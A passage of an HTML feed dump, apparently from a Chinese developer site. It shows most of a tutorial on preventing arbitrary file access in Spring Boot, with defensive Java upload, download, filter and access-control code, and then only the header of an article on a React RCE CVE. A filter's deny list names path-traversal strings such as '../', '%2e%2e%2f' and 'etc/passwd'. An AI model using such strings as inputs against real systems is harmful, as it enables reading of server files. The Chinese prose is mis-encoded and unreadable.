                    <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶æ‰©å±•å</span>
                    <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> getFileExtension(normalizedPath.toString());
                    <span class="hljs-keyword">return</span> ALLOWED_EXTENSIONS.contains(extension.toLowerCase());
                }
            }

            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getFileExtension</span><span class="hljs-params">(String filename)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">lastDot</span> <span class="hljs-operator">=</span> filename.lastIndexOf(<span class="hljs-string">'.'</span>);
        <span class="hljs-keyword">return</span> lastDot &gt; <span class="hljs-number">0</span> ? filename.substring(lastDot + <span class="hljs-number">1</span>) : <span class="hljs-string">""</span>;
    }
}
</code></pre>
<h4 data-id="heading-8">2. å®‰å…¨çš„æ–‡ä»¶è®¿é—®æ§åˆ¶å™¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/files")</span>
<span class="hljs-meta">@Validated</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureFileController</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> SecureFileService fileService;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SecureFileController</span><span class="hljs-params">(SecureFileService fileService)</span> {
        <span class="hljs-built_in">this</span>.fileService = fileService;
    }

    <span class="hljs-meta">@GetMapping("/download/**")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Resource&gt; <span class="hljs-title function_">downloadFile</span><span class="hljs-params">(HttpServletRequest request)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æå–è¯·æ±‚è·¯å¾„ä¸­çš„æ–‡ä»¶è·¯å¾„éƒ¨åˆ†</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">requestURI</span> <span class="hljs-operator">=</span> request.getRequestURI();
            <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> requestURI.substring(<span class="hljs-string">"/api/files/download/"</span>.length());

            <span class="hljs-comment">// å®‰å…¨éªŒè¯</span>
            <span class="hljs-keyword">if</span> (!fileService.isPathSafe(filePath)) {
                <span class="hljs-keyword">return</span> ResponseEntity.badRequest()
                    .body((Resource) <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringResource</span>(<span class="hljs-string">"Invalid file path"</span>));
            }

            <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath).normalize();
            <span class="hljs-type">Resource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlResource</span>(path.toUri());

            <span class="hljs-keyword">if</span> (!resource.exists() || !resource.isReadable()) {
                <span class="hljs-keyword">return</span> ResponseEntity.notFound().build();
            }

            <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶å¤§å°é™åˆ¶</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">fileSize</span> <span class="hljs-operator">=</span> resource.contentLength();
            <span class="hljs-keyword">if</span> (fileSize &gt; <span class="hljs-number">100</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) { <span class="hljs-comment">// 100MB limit</span>
                <span class="hljs-keyword">return</span> ResponseEntity.badRequest()
                    .body((Resource) <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringResource</span>(<span class="hljs-string">"File too large"</span>));
            }

            <span class="hljs-type">String</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> Files.probeContentType(path);
            <span class="hljs-keyword">if</span> (contentType == <span class="hljs-literal">null</span>) {
                contentType = <span class="hljs-string">"application/octet-stream"</span>;
            }

            <span class="hljs-keyword">return</span> ResponseEntity.ok()
                .contentType(MediaType.parseMediaType(contentType))
                .header(HttpHeaders.CONTENT_DISPOSITION,
                        <span class="hljs-string">"attachment; filename=\""</span> + path.getFileName() + <span class="hljs-string">"\""</span>)
                .body(resource);

        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">return</span> ResponseEntity.internalServerError().build();
        }
    }
}
</code></pre>
<h4 data-id="heading-9">3. å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;
<span class="hljs-keyword">import</span> org.apache.commons.io.FilenameUtils;
<span class="hljs-keyword">import</span> org.apache.commons.lang3.RandomStringUtils;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureFileUploadService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">MAX_FILE_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 10MB</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Path</span> <span class="hljs-variable">UPLOAD_DIR</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"/app/uploads"</span>).toAbsolutePath().normalize();

    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            Files.createDirectories(UPLOAD_DIR);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Could not create upload directory"</span>, e);
        }
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadFile</span><span class="hljs-params">(MultipartFile file)</span> {
        <span class="hljs-comment">// 1. åŸºæœ¬éªŒè¯</span>
        <span class="hljs-keyword">if</span> (file.isEmpty()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"File is empty"</span>);
        }

        <span class="hljs-keyword">if</span> (file.getSize() &gt; MAX_FILE_SIZE) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"File size exceeds limit"</span>);
        }

        <span class="hljs-comment">// 2. æ–‡ä»¶åéªŒè¯å’Œå¤„ç†</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
        <span class="hljs-keyword">if</span> (!isValidFilename(originalFilename)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Invalid filename"</span>);
        }

        <span class="hljs-comment">// 3. æ–‡ä»¶ç±»å‹éªŒè¯ï¼ˆä½¿ç”¨é­”æœ¯å­—èŠ‚ï¼Œè€Œä¸ä»…ä»…æ˜¯æ‰©å±•åï¼‰</span>
        <span class="hljs-keyword">if</span> (!isValidFileType(file)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Invalid file type"</span>);
        }

        <span class="hljs-comment">// 4. ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶å</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> FilenameUtils.getExtension(originalFilename);
        <span class="hljs-type">String</span> <span class="hljs-variable">safeFilename</span> <span class="hljs-operator">=</span> generateSafeFilename(extension);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Path</span> <span class="hljs-variable">targetLocation</span> <span class="hljs-operator">=</span> UPLOAD_DIR.resolve(safeFilename);

            <span class="hljs-comment">// ç¡®ä¿æ–‡ä»¶åœ¨å…è®¸çš„ç›®å½•å†…</span>
            <span class="hljs-keyword">if</span> (!targetLocation.normalize().startsWith(UPLOAD_DIR)) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>(<span class="hljs-string">"Attempted path traversal attack"</span>);
            }

            Files.copy(file.getInputStream(), targetLocation, StandardCopyOption.REPLACE_EXISTING);

            <span class="hljs-keyword">return</span> safeFilename;

        } <span class="hljs-keyword">catch</span> (IOException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Failed to store file"</span>, e);
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidFilename</span><span class="hljs-params">(String filename)</span> {
        <span class="hljs-keyword">if</span> (filename == <span class="hljs-literal">null</span> || filename.trim().isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-comment">// æ£€æŸ¥å±é™©å­—ç¬¦</span>
        <span class="hljs-keyword">if</span> (filename.contains(<span class="hljs-string">".."</span>) || filename.contains(<span class="hljs-string">"/"</span>) ||
            filename.contains(<span class="hljs-string">"\\"</span>) || filename.contains(<span class="hljs-string">":"</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶åé•¿åº¦</span>
        <span class="hljs-keyword">return</span> filename.length() &lt;= <span class="hljs-number">255</span>;
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidFileType</span><span class="hljs-params">(MultipartFile file)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
        <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> FilenameUtils.getExtension(filename).toLowerCase();

        <span class="hljs-comment">// å…è®¸çš„æ–‡ä»¶ç±»å‹</span>
        Set&lt;String&gt; allowedExtensions = Set.of(<span class="hljs-string">"jpg"</span>, <span class="hljs-string">"jpeg"</span>, <span class="hljs-string">"png"</span>, <span class="hljs-string">"gif"</span>, <span class="hljs-string">"pdf"</span>, <span class="hljs-string">"txt"</span>);
        <span class="hljs-keyword">if</span> (!allowedExtensions.contains(extension)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-comment">// æ–‡ä»¶å¤´éªŒè¯ï¼ˆé­”æœ¯å­—èŠ‚ï¼‰</span>
        <span class="hljs-type">byte</span>[] fileBytes = file.getBytes();
        <span class="hljs-keyword">return</span> isValidFileHeader(fileBytes, extension);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidFileHeader</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] fileBytes, String extension)</span> {
        <span class="hljs-keyword">if</span> (fileBytes.length &lt; <span class="hljs-number">4</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-comment">// ç®€åŒ–çš„æ–‡ä»¶å¤´éªŒè¯, å¯ä»¥ä½¿ç”¨ Apache Tikaåº“æ¥åˆ¤æ–­</span>
        <span class="hljs-keyword">switch</span> (extension) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">"jpg"</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-string">"jpeg"</span>:
                <span class="hljs-keyword">return</span> fileBytes[<span class="hljs-number">0</span>] == (<span class="hljs-type">byte</span>) <span class="hljs-number">0xFF</span> &amp;&amp; fileBytes[<span class="hljs-number">1</span>] == (<span class="hljs-type">byte</span>) <span class="hljs-number">0xD8</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">"png"</span>:
                <span class="hljs-keyword">return</span> fileBytes[<span class="hljs-number">0</span>] == (<span class="hljs-type">byte</span>) <span class="hljs-number">0x89</span> &amp;&amp; fileBytes[<span class="hljs-number">1</span>] == <span class="hljs-number">0x50</span> &amp;&amp;
                       fileBytes[<span class="hljs-number">2</span>] == <span class="hljs-number">0x4E</span> &amp;&amp; fileBytes[<span class="hljs-number">3</span>] == <span class="hljs-number">0x47</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">"pdf"</span>:
                <span class="hljs-keyword">return</span> fileBytes[<span class="hljs-number">0</span>] == <span class="hljs-number">0x25</span> &amp;&amp; fileBytes[<span class="hljs-number">1</span>] == <span class="hljs-number">0x50</span> &amp;&amp;
                       fileBytes[<span class="hljs-number">2</span>] == <span class="hljs-number">0x44</span> &amp;&amp; fileBytes[<span class="hljs-number">3</span>] == <span class="hljs-number">0x46</span>;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// å¯¹äºæ–‡æœ¬æ–‡ä»¶ï¼Œæ”¾å®½æ£€æŸ¥</span>
        }
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">generateSafeFilename</span><span class="hljs-params">(String extension)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">randomPart</span> <span class="hljs-operator">=</span> RandomStringUtils.randomAlphanumeric(<span class="hljs-number">16</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> String.valueOf(System.currentTimeMillis());
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%s_%s.%s"</span>, timestamp, randomPart, extension);
    }
}
</code></pre>
<h4 data-id="heading-10">4. é…ç½®å®‰å…¨è¿‡æ»¤å™¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileSecurityFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; DANGEROUS_PATHS = Set.of(
        <span class="hljs-string">".."</span>, <span class="hljs-string">"../"</span>, <span class="hljs-string">"..\\"</span>, <span class="hljs-string">"%2e%2e%2f"</span>, <span class="hljs-string">"%2e%2e\\"</span>,
        <span class="hljs-string">"etc/passwd"</span>, <span class="hljs-string">"windows/system32"</span>, <span class="hljs-string">"boot.ini"</span>
    );

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,
                        FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException {

        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">httpRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;
        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">httpResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;

        <span class="hljs-type">String</span> <span class="hljs-variable">requestURI</span> <span class="hljs-operator">=</span> httpRequest.getRequestURI();
        <span class="hljs-type">String</span> <span class="hljs-variable">queryString</span> <span class="hljs-operator">=</span> httpRequest.getQueryString();

        <span class="hljs-comment">// æ£€æŸ¥è·¯å¾„éå†æ”»å‡»</span>
        <span class="hljs-keyword">if</span> (containsPathTraversal(requestURI, queryString)) {
            httpResponse.sendError(HttpServletResponse.SC_BAD_REQUEST,
                                  <span class="hljs-string">"Invalid request - potential path traversal"</span>);
            <span class="hljs-keyword">return</span>;
        }

        chain.doFilter(request, response);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsPathTraversal</span><span class="hljs-params">(String uri, String queryString)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">fullRequest</span> <span class="hljs-operator">=</span> uri;
        <span class="hljs-keyword">if</span> (queryString != <span class="hljs-literal">null</span>) {
            fullRequest += <span class="hljs-string">"?"</span> + queryString;
        }

        <span class="hljs-type">String</span> <span class="hljs-variable">lowerCaseRequest</span> <span class="hljs-operator">=</span> fullRequest.toLowerCase();

        <span class="hljs-keyword">return</span> DANGEROUS_PATHS.stream()
            .anyMatch(lowerCaseRequest::contains);
    }
}
</code></pre>
<h2 data-id="heading-11">é«˜çº§å®‰å…¨æªæ–½</h2>
<h4 data-id="heading-12">1. ä½¿ç”¨è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualFileSystemService</span> {

    <span class="hljs-comment">// å°†æ–‡ä»¶æ˜ å°„åˆ°è™šæ‹Ÿè·¯å¾„ï¼Œéšè—çœŸå®æ–‡ä»¶ç³»ç»Ÿç»“æ„</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, FileInfo&gt; virtualFileMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åˆå§‹åŒ–è™šæ‹Ÿæ–‡ä»¶æ˜ å°„</span>
        scanAndMapFiles(Paths.get(<span class="hljs-string">"/app/uploads"</span>), <span class="hljs-string">"/virtual/files"</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">scanAndMapFiles</span><span class="hljs-params">(Path realPath, String virtualBasePath)</span> {
        <span class="hljs-keyword">try</span> {
            Files.walk(realPath)
                .filter(Files::isRegularFile)
                .forEach(realFile -&gt; {
                    <span class="hljs-type">String</span> <span class="hljs-variable">relativePath</span> <span class="hljs-operator">=</span> realPath.relativize(realFile).toString();
                    <span class="hljs-type">String</span> <span class="hljs-variable">virtualPath</span> <span class="hljs-operator">=</span> virtualBasePath + <span class="hljs-string">"/"</span> + relativePath;
                    virtualFileMap.put(virtualPath, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInfo</span>(realFile, virtualPath));
                });
        } <span class="hljs-keyword">catch</span> (IOException e) {
            log.error(<span class="hljs-string">"Failed to scan files"</span>, e);
        }
    }

    <span class="hljs-keyword">public</span> Optional&lt;Resource&gt; <span class="hljs-title function_">getFileByVirtualPath</span><span class="hljs-params">(String virtualPath)</span> {
        <span class="hljs-type">FileInfo</span> <span class="hljs-variable">fileInfo</span> <span class="hljs-operator">=</span> virtualFileMap.get(virtualPath);
        <span class="hljs-keyword">if</span> (fileInfo == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> Optional.empty();
        }

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Resource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlResource</span>(fileInfo.getRealPath().toUri());
            <span class="hljs-keyword">return</span> Optional.of(resource);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">return</span> Optional.empty();
        }
    }

    <span class="hljs-meta">@Data</span>
    <span class="hljs-meta">@AllArgsConstructor</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInfo</span> {
        <span class="hljs-keyword">private</span> Path realPath;
        <span class="hljs-keyword">private</span> String virtualPath;
    }
}
</code></pre>
<h4 data-id="heading-13">2. æ–‡ä»¶è®¿é—®æƒé™æ§åˆ¶</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileAccessControlService</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canAccessFile</span><span class="hljs-params">(String userId, String virtualPath, String action)</span> {
        <span class="hljs-comment">// åŸºäºç”¨æˆ·è§’è‰²çš„æ–‡ä»¶è®¿é—®æ§åˆ¶</span>
        <span class="hljs-type">UserInfo</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> getUserInfo(userId);
        <span class="hljs-type">FileInfo</span> <span class="hljs-variable">fileInfo</span> <span class="hljs-operator">=</span> getFileInfo(virtualPath);

        <span class="hljs-keyword">if</span> (fileInfo == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶æ‰€æœ‰æƒ</span>
        <span class="hljs-keyword">if</span> (userInfo.getRole() == UserRole.ADMIN) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// ç®¡ç†å‘˜å¯ä»¥è®¿é—®æ‰€æœ‰æ–‡ä»¶</span>
        }

        <span class="hljs-comment">// æ™®é€šç”¨æˆ·åªèƒ½è®¿é—®è‡ªå·±çš„æ–‡ä»¶</span>
        <span class="hljs-keyword">return</span> fileInfo.getOwnerId().equals(userId);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logFileAccess</span><span class="hljs-params">(String userId, String virtualPath, String action, <span class="hljs-type">boolean</span> success)</span> {
        <span class="hljs-type">FileAccessLog</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> FileAccessLog.builder()
            .userId(userId)
            .virtualPath(virtualPath)
            .action(action)
            .success(success)
            .timestamp(LocalDateTime.now())
            .userAgent(getCurrentUserAgent())
            .clientIp(getClientIp())
            .build();

        fileAccessLogRepository.save(log);
    }
}
</code></pre>
<h4 data-id="heading-14">3. æ–‡ä»¶å®Œæ•´æ€§æ£€æŸ¥</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileIntegrityChecker</span> {

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">calculateFileHash</span><span class="hljs-params">(Path filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(filePath);
        <span class="hljs-keyword">return</span> DigestUtils.sha256Hex(fileBytes);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verifyFileIntegrity</span><span class="hljs-params">(Path filePath, String expectedHash)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">String</span> <span class="hljs-variable">actualHash</span> <span class="hljs-operator">=</span> calculateFileHash(filePath);
        <span class="hljs-keyword">return</span> MessageDigest.isEqual(
            actualHash.getBytes(StandardCharsets.UTF_8),
            expectedHash.getBytes(StandardCharsets.UTF_8)
        );
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">generateIntegrityReport</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å®šæœŸæ‰«æä¸Šä¼ ç›®å½•ï¼Œç”Ÿæˆæ–‡ä»¶å®Œæ•´æ€§æŠ¥å‘Š</span>
        Map&lt;String, String&gt; fileHashes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

        <span class="hljs-keyword">try</span> {
            Files.walk(Paths.get(<span class="hljs-string">"/app/uploads"</span>))
                .filter(Files::isRegularFile)
                .forEach(file -&gt; {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-type">String</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> calculateFileHash(file);
                        fileHashes.put(file.toString(), hash);
                    } <span class="hljs-keyword">catch</span> (IOException e) {
                        log.error(<span class="hljs-string">"Failed to calculate hash for file: "</span> + file, e);
                    }
                });

            <span class="hljs-comment">// ä¿å­˜æˆ–æ¯”è¾ƒå®Œæ•´æ€§æŠ¥å‘Š</span>
            saveIntegrityReport(fileHashes);

        } <span class="hljs-keyword">catch</span> (IOException e) {
            log.error(<span class="hljs-string">"Failed to scan upload directory"</span>, e);
        }
    }
}
</code></pre>
<h4 data-id="heading-15">4. åº”ç”¨é…ç½®æ–‡ä»¶</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">servlet:</span>
    <span class="hljs-attr">multipart:</span>
      <span class="hljs-attr">max-file-size:</span> <span class="hljs-string">10MB</span>
      <span class="hljs-attr">max-request-size:</span> <span class="hljs-string">10MB</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">file:</span>
  <span class="hljs-attr">upload:</span>
    <span class="hljs-attr">base-path:</span> <span class="hljs-string">/app/uploads</span>
    <span class="hljs-attr">max-size:</span> <span class="hljs-number">10485760</span>  <span class="hljs-comment"># 10MB</span>
    <span class="hljs-attr">allowed-extensions:</span> <span class="hljs-string">jpg,jpeg,png,gif,pdf,txt,doc,docx</span>
    <span class="hljs-attr">allowed-mime-types:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">image/jpeg</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">image/png</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">image/gif</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">application/pdf</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">text/plain</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">application/msword</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">application/vnd.openxmlformats-officedocument.wordprocessingml.document</span>
  <span class="hljs-attr">security:</span>
    <span class="hljs-attr">enable-path-traversal-protection:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">enable-file-integrity-check:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">enable-access-logging:</span> <span class="hljs-literal">true</span>
</code></pre>
<h2 data-id="heading-16">æ€»ç»“</h2>
<p>é€šè¿‡æœ¬æ–‡çš„ä»‹ç»ï¼Œæˆ‘ä»¬äº†è§£äº†Spring Bootåº”ç”¨ä¸­æ–‡ä»¶è®¿é—®çš„ä¸»è¦å®‰å…¨é£é™©å’Œç›¸åº”çš„é˜²æŠ¤æªæ–½ã€‚</p>
<p>æ–‡ä»¶å®‰å…¨æ˜¯ä¸€ä¸ªæŒç»­çš„è¿‡ç¨‹ï¼Œéœ€è¦å®šæœŸå®¡æŸ¥å’Œæ›´æ–°å®‰å…¨ç­–ç•¥ã€‚é€šè¿‡å®æ–½ä¸Šè¿°æªæ–½ï¼Œæ‚¨å¯ä»¥æ˜¾è‘—æé«˜Spring Bootåº”ç”¨çš„æ–‡ä»¶è®¿é—®å®‰å…¨æ€§ï¼Œæœ‰æ•ˆé˜²èŒƒä»»æ„æ–‡ä»¶è®¿é—®æ¼æ´ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React RCE æ¼æ´å½±å“è‡ªå»º Umami æœåŠ¡ â€”â€” è®° CVE-2025-55182]]></title>    <link>https://juejin.cn/post/7581025279645433894</link>    <guid>https://juejin.cn/post/7581025279645433894</guid>    <pubDate>2025-12-08T04:20:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581025279645433894" data-draft-id="7581004702945280027" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React RCE æ¼æ´å½±å“è‡ªå»º Umami æœåŠ¡ â€”â€” è®° CVE-2025-55182"/> <meta itemprop="keywords" content="å‰ç«¯,å®‰å…¨,React.js"/> <meta itemprop="datePublished" content="2025-12-08T04:20:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cos"/> <meta itemprop="url" content="https://juejin.cn/user/1698115646132254"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React RCE æ¼æ´å½±å“è‡ªå»º Umami æœåŠ¡ â€”â€” è®° CVE-2025-55182
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1698115646132254/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cos
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:20:39.000Z" title="Mon Dec 08 2025 04:20:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
